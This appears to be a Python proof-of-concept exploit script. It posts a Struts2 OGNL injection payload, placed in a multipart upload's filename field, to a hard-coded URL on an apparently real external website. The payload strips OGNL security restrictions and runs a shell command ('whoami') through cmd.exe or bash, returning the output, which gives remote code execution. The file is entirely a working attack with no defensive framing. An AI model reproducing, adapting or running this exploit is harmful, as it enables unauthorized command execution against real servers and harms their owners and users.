import requests

#py3
class Sugarcrm():
    def poctest(self):
        boundary="---------------------------735323031399963166993862150"
        paylaod="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        url = 'http://www.zjpmw.com/jsp/template20000/toIndex'
        headers = {'Content-Type': 'multipart/form-data; boundary='+boundary+''}
        data ="--"+boundary+"\r\nContent-Disposition: form-data; name=\"foo\"; filename=\""+paylaod+"\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--"+boundary+"--"
        r=requests.post(url, headers=headers,data=data)
        print(r._content)


if __name__ == '__main__':
    test = Sugarcrm()
    test.poctest()
